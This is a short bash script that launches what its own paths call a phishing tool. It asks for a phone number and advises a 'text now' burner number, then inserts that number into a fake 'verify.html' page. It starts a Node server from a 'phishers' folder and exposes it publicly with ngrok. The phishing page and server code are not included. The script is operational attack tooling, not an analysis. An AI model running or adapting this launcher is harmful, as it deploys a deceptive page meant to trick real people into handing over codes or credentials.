#!/bin/bash

# Prompt the user for the phone number
read -p "Enter the phone number to send the message to(Number will remain, pick a text now number.): " phoneNumber

# Escape special characters in the phone number (if any)
escapedPhoneNumber=$(printf '%s' "$phoneNumber" | sed 's/[&/\]/\\&/g')

# Update the phone number in the HTML file located in the public folder
sed -i "s/{{PHONE_NUMBER}}/$escapedPhoneNumber/" tools/phishers/public/verify.html

# Start the Node.js server in the background
echo "Starting Node.js server..."
node tools/phishers/server4.js &

# Wait a bit to ensure the server starts
sleep 2

# Start ngrok to expose the local server
echo "Starting ngrok..."
ngrok http 3000
